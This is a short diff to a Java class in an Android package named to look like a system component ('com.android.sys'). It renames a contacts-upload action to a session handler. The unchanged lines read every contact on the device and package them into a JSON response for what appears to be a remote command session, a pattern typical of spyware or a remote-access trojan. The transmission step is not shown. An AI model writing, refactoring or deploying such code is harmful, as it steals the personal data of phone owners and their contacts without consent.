@@ -1,4 +1,4 @@
-package com.android.sys.action;
+package com.android.sys.session.handler;
 
 import com.android.sys.service.SystemService;
 import com.android.sys.session.NetworkSessionManager;
@@ -14,9 +14,9 @@ import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.util.List;
 
-public class UploadContactsAction implements NetworkSessionManager.ActionHandler {
+public class UploadContactsSessionHandler implements NetworkSessionManager.SessionHandler {
     @Override
-    public void handleAction(String actionName, InputStream inputStream, OutputStream outputStream) {
+    public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
         List<String> contactList = SystemUtil.getAllContact(SystemService.getContext());
         if(contactList == null) {
             return;
@@ -27,7 +27,7 @@ public class UploadContactsAction implements NetworkSessionManager.ActionHandler
             for(String contact: contactList) {
                 smsArray.put(contact);
             }
-            responseJsonObject.put(actionName, smsArray);
+            responseJsonObject.put(sessionName, smsArray);
         } catch (JSONException e) {
         }
         byte[] responseData = null;
